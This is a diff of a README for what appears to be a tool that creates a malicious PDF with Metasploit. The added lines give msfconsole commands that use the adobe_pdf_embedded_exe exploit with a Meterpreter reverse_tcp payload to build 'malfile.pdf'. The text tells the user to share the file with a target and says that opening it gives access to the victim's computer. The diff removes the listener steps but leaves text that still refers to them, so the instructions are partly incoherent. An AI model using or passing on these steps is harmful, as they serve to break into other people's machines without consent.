@@ -27,23 +27,27 @@ $./setup.sh
 
 All the needed packages and frameworks will be downloaded
 
-Now to create malicious pdf and use, run the 'create.sh'file by typing:
+Now to create malicious pdf and use, type
 
 $cd metasploit-framework
 
 $msfconsole
+sudo bash create.sh
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+set payload windows/meterpreter/reverse_tcp
+set FILENAME malfile.pdf
+set LPORT 4444
+show options
+show info
+run
+exit
+cd ..
 
-$sudo bash create.sh
 
  You will get a file path and you can shere the file to your target
 
 To listen to the pdf, type:
 
-$sudo bash listen.sh
-
-$set LHOST <your_ip>
-
-$run
 
 Replace <your_ip> with your ip address
 Now your pc will start listening. As soon as your target opens the pdf, you will get access over his pc
